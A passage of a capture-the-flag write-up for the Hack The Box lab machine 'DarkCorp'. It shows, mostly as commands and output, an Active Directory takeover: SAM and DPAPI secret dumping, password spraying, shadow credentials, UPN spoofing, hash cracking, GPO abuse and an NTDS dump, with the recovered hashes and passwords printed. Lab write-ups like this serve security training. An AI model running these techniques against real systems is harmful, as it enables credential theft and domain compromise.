+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Dumping SAM hashes
+SMB         web-01.darkcorp.htb 445    WEB-01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
+SMB         web-01.darkcorp.htb 445    WEB-01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web-01.darkcorp.htb 445    WEB-01           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web-01.darkcorp.htb 445    WEB-01           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] Added 4 SAM hashes to the database</code></pre><p>I can also dump the SAM</p><h2>Access as administrator on WINRM (<code>web-01</code>)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i web-01.darkcorp.htb -u administrator -H &#39;88d84ec08dad123eb04a060a74053f21&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p>I now have access as the administrator</p><h2>Extraciting DPAPI secrets</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb web-01.darkcorp.htb --use-kcache --dpapi 
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] Got 6 decrypted masterkeys. Looting secrets...
+SMB         web-01.darkcorp.htb 445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!</code></pre><p>The nxc module extracted a password, however having never used this functionality in nxc im going to check it manually as well</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500&gt; dir -force
+
+
+    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/15/2025   4:11 PM            468 189c6409-5515-4114-81d2-6dde4d6912ce
+-a-hs-         1/16/2025  10:35 AM            468 6037d071-cac5-481e-9e08-c4296c0a7ff7
+-a-hs-         9/10/2026   9:19 AM            468 f22d8b80-b64e-4aea-bc67-662aaca5aa41
+-a-hs-         9/10/2026   9:19 AM             24 Preferred</code></pre><p>I have found 3 keys</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials&gt; dir -force
+
+
+    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/16/2025  11:01 AM            560 32B2774DF751FF7E28E78AE75C237A1E</code></pre><p>And also a credential</p><p>Ill download all of them</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">dpapi.py masterkey -file 6037d071-cac5-481e-9e08-c4296c0a7ff7 -sid S-1-5-21-2988385993-1727309239-2541228647-500
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 6037d071-cac5-481e-9e08-c4296c0a7ff7
+Flags       :        5 (5)
+Policy      :        0 (0)
+MasterKeyLen: 000000b0 (176)
+BackupKeyLen: 00000090 (144)
+CredHistLen : 00000014 (20)
+DomainKeyLen: 00000000 (0)
+
+Password:
+Decrypted key with User Key (SHA1)
+Decrypted key: 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da</code></pre><p>Using the password nxc found <code>But_Lying_Aid9!</code> i am able to decrpyt the key</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">dpapi.py credential -file 32B2774DF751FF7E28E78AE75C237A1E -key &#39;0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da&#39;
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-01-16 19:01:39+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
+Type        : 0x00000001 (CRED_TYPE_GENERIC)
+Target      : LegacyGeneric:target=WEB-01
+Description : Updated by: Administrator on: 1/16/2025
+Unknown     : 
+Username    : Administrator
+Unknown     : Pack_Beneath_Solid9!</code></pre><p>I can then use this key to get another password!</p><p>The other two keys failed to decrpyt it!</p><h2>Compromising <code>john.w</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc-01.darkcorp.htb -u users.txt -p &#39;Pack_Beneath_Solid9!&#39; --continue-on-success
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Administrator:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Guest:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\krbtgt:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DC-01$:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\svc_acc:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john.w:Pack_Beneath_Solid9! 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w.adm:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DRIP$:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b.adm:Pack_Beneath_Solid9! STATUS_LOGON_FAILURE</code></pre><p>Ill spray this password against some of the users, and i have compromised <code>john.w</code></p><h2>Compromising <code>angela.w</code></h2><p><img src="images/darkcorp/pasted-image-20260910192004.webp" alt="Screenshot" loading="lazy" /></p><p>My current user has GenericWrite on this user!</p><p>So its either a targeted kerberoast or shadow credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad shadow auto -u &#39;john.w@darkcorp.htb&#39; -p &#39;Pack_Beneath_Solid9!&#39; -account &#39;angela.w&#39; -dc-host dc-01.darkcorp.htb -dc-ip 172.16.20.1 -ldap-scheme ldap
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting user &#39;angela.w&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;1e2b25402f2d44cf8f1911fdaf14a010&#39;
+[*] Adding Key Credential with device ID &#39;1e2b25402f2d44cf8f1911fdaf14a010&#39; to the Key Credentials for &#39;angela.w&#39;
+[*] Successfully added Key Credential with device ID &#39;1e2b25402f2d44cf8f1911fdaf14a010&#39; to the Key Credentials for &#39;angela.w&#39;
+[*] Authenticating as &#39;angela.w&#39; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &#39;angela.w@darkcorp.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;angela.w.ccache&#39;
+[*] Wrote credential cache to &#39;angela.w.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;angela.w&#39;
+[*] Restoring the old Key Credentials for &#39;angela.w&#39;
+[*] Successfully restored the old Key Credentials for &#39;angela.w&#39;
+[*] NT hash for &#39;angela.w&#39;: 957246c8137069bca672dc6aa0af7c7a</code></pre><p>Ill apply shadow credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc-01.darkcorp.htb -u angela.w -H &#39;957246c8137069bca672dc6aa0af7c7a&#39;           
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\angela.w:957246c8137069bca672dc6aa0af7c7a</code></pre><p>This user is now compromised</p><h2>UPN spoofing leads to compromised of <code>angela.w.adm</code></h2><p>Using <code>john.w</code> credentials i can see that this user does not have a UPN set, i can set one then request a TGT as the admin user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p &#39;Pack_Beneath_Solid9!&#39; set object angela.w userPrincipalName -v &#39;angela.w.adm&#39;
+[+] angela.w&#39;s userPrincipalName has been updated</code></pre><p>Ill set the UPN of the user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">getTGT.py -hashes &#39;:957246c8137069bca672dc6aa0af7c7a&#39; -principalType &#39;NT_ENTERPRISE&#39; darkcorp.htb/angela.w.adm
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in angela.w.adm.ccache</code></pre><p>Then ill request a TGT for this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp angela.w.adm.ccache ebelford@drip.htb:/tmp
+ebelford@drip.htb&#39;s password: 
+angela.w.adm.ccache</code></pre><p>Ill transfer this to the linux host</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ebelford@drip:/tmp$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
+Authenticated angela.w.adm@DARKCORP.HTB
+Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful
+Changing uid to angela.w.adm (1730401107)
+angela.w.adm@drip:/tmp$</code></pre><p>Then after using SSH to logon ill use the ticket to logon as the admin user account</p><h2>Root access on the drip server</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">angela.w.adm@drip:/tmp$ sudo su
+root@drip:/tmp# 
+root@drip:/tmp# 
+root@drip:/tmp# 
+root@drip:/tmp# 
+root@drip:/tmp# 
+root@drip:/tmp#</code></pre><p>This user has full sudo permissions</p><h2>Cached credentials</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">root@drip:/etc/sssd# cat sssd.conf 
+
+[sssd]
+services = nss, pam
+domains = darkcorp.htb
+
+[domain/darkcorp.htb]
+id_provider = ad
+cache_credentials = True
+auth_provider = ad
+access_provider = simple
+default_shell = /bin/bash
+use_fully_qualified_names= False
+krb5_store_password_if_offline = True
+simple_allow_groups = linux_admins</code></pre><p>There is cached credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">root@drip:/var/lib/sss/db# ls -la
+total 5676
+drwx------  2 root root    4096 Sep 10 12:42 .
+drwxr-xr-x 10 root root    4096 Jan 10  2025 ..
+-rw-------  1 root root 1609728 Sep 10 12:19 cache_darkcorp.htb.ldb
+-rw-------  1 root root    2615 Sep 10 12:42 ccache_DARKCORP.HTB
+-rw-------  1 root root 1286144 Sep 10 10:11 config.ldb
+-rw-------  1 root root 1286144 Dec 30  2024 sssd.ldb
+-rw-------  1 root root 1609728 Sep 10 12:46 timestamps_darkcorp.htb.ldb
+root@drip:/var/lib/sss/db#</code></pre><p>Ill have a look through some of these files</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">root@drip:/var/lib/sss/db# cat cache_darkcorp.htb.ldb | grep -a &#39;cachedPassword&#39;
+1789068860initgrExpireTimestamp0memberofAname=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdbccacheFile&quot;FILE:/tmp/krb5cc_1730401105_e6TfYScachedPasswordj$6$cyKiP3FHinOP63vG$1GF26r27xAXyH8enqLxsUrzf45dh5xK3U2hm9gIuYKCnqGB8VAxPHS55K8.XjbtdrVTSyPdG1wiV7o/CxibDH1cachedPasswordType1lastCachedPasswordChange
+1789068860initgrExpireTimestamp0memberofAname=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdbccacheFile&quot;FILE:/tmp/krb5cc_1730401105_e6TfYScachedPasswordj$6$cyKiP3FHinOP63vG$1GF26r27xAXyH8enqLxsUrzf45dh5xK3U2hm9gIuYKCnqGB8VAxPHS55K8.XjbtdrVTSyPdG1wiV7o/CxibDH1cachedPasswordType1lastCachedPasswordChange
+1736373877initgrExpireTimestamp0ccacheFile&quot;FILE:/tmp/krb5cc_1730414101_B5njULcachedPasswordj$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.cachedPasswordType1lastCachedPasswordChange</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat &#39;$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.&#39; /usr/share/wordlists/rockyou.txt
+
+$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.:!QAZzaq1</code></pre><p>This hash cracked</p><h2>Compromising <code>talyor.b.adm</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc-01.darkcorp.htb -u users.txt -p &#39;!QAZzaq1&#39; --continue-on-success            
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Administrator:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Guest:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\krbtgt:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DC-01$:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\svc_acc:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\john.w:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w.adm:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DRIP$:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1</code></pre><p>I have compromised the user <code>taylor.b.adm</code></p><p><img src="images/darkcorp/pasted-image-20260910200914.webp" alt="Screenshot" loading="lazy" /></p><p>This is game over!</p><p>This user is part of remote management users</p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 pygpoabuse.py &#39;darkcorp.htb&#39;/&#39;taylor.b.adm&#39;:&#39;!QAZzaq1&#39; -gpo-id &#39;652CAE9A-4BB7-49F2-9E52-3361F33CE786&#39; -f
+[+] ScheduledTask TASK_f7202c64 created!</code></pre><p>Ill set the schedules task, this will create a admin user on the machine called <code>john</code> with a password that can be found on the github page</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc-01.darkcorp.htb -u taylor.b.adm -p &#39;!QAZzaq1&#39;       
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents&gt; gpupdate
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+
+
+*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents&gt;</code></pre><p>Ill update the policy</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc-01.darkcorp.htb -u john -p &#39;H4x00r123..&#39; --ntds
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john:H4x00r123.. (Pwn3d!)
+SMB         172.16.20.1     445    DC-01            [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         172.16.20.1     445    DC-01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
+SMB         172.16.20.1     445    DC-01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         172.16.20.1     445    DC-01            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
+SMB         172.16.20.1     445    DC-01            victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
+SMB         172.16.20.1     445    DC-01            svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
+SMB         172.16.20.1     445    DC-01            john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
+SMB         172.16.20.1     445    DC-01            angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
+SMB         172.16.20.1     445    DC-01            angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
+SMB         172.16.20.1     445    DC-01            taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
+SMB         172.16.20.1     445    DC-01            taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
+SMB         172.16.20.1     445    DC-01            darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
+SMB         172.16.20.1     445    DC-01            darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
+SMB         172.16.20.1     445    DC-01            john:33601:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
+SMB         172.16.20.1     445    DC-01            DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
+SMB         172.16.20.1     445    DC-01            DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:54368cbc18c6785851ec88c118d9fa78:::
+SMB         172.16.20.1     445    DC-01            WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
+SMB         172.16.20.1     445    DC-01            [+] Dumped 16 NTDS hashes to /home/kali/.nxc/logs/ntds/DC-01_172.16.20.1_2026-09-10_202006.ntds of which 13 were added to the database
+SMB         172.16.20.1     445    DC-01            [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         172.16.20.1     445    DC-01            [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC-01_172.16.20.1_2026-09-10_202006.ntds | cut -d &#39;:&#39; -f1</code></pre><p>Full domain compromise!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc-01.darkcorp.htb -u john -p &#39;H4x00r123..&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\john\Documents&gt; cd ../../Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         9/10/2026   9:11 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Domain Admin</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-hercules/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Hercules</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-ghost/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Ghost</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
